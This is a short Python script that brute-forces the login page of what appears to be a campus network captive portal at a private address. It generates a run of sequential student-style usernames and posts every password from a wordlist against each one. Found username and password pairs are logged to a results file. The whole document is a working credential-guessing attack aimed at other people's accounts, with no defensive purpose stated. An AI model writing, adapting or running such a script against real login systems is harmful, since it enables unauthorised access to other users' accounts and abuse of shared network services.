import requests
import time

url = "http://172.16.254.254:8090/login.xml"

user = "btcse160130"
# r = requests.post(url, data=cookie)

with open("passwordlist.txt", "r") as file:
    words = file.readlines()
    file.close()

usernames = []

for number in range(4,120):
    temp = ""
    if number < 10:
        temp+="00"
    elif number <100:
        temp+="0"
    temp = user + temp + str(number)
    usernames.append(temp)

for username in usernames:
    count = 0
    print("Username : " + username, end=" ")
    for word in words:
        count+=1
        cookie = {"mode":191,"username":username, "password":word,"a":int(str(time.time_ns())[:13]), "producttype":1}
        r = requests.post(url, data=cookie)
        print(count, end=" ")
        if count / len(words) % 10 == 0:
            print(count / len(words), end=" ")
        

        if "You are signed in as" in r.text or "You have reached the maximum login limit" in r.text:
            print("Found : " + word)
            with open("result.txt", "a+") as file:
                file.write(username + " : " + word + "\n")
                file.close()






